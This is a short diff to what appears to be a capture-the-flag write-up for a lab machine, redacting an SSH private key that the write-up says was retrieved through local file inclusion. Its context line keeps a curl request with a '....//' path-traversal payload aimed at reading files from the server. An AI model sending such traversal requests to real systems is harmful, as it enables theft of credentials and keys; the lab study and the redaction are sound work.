@@ -285,10 +285,10 @@ curl -s "http://preprod-marketing.trick.htb/index.php?page=....//....//....//...
 **Response:**
 
 ```
------BEGIN OPENSSH PRIVATE KEY-----
-b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
+-----BEGIN OPENSSH PRIVATE KEY----- [REDACTED]
+[key content redacted]
 ...
------END OPENSSH PRIVATE KEY-----
+-----END OPENSSH PRIVATE KEY----- [REDACTED]
 ```
 
 **SSH private key retrieved via LFI.**
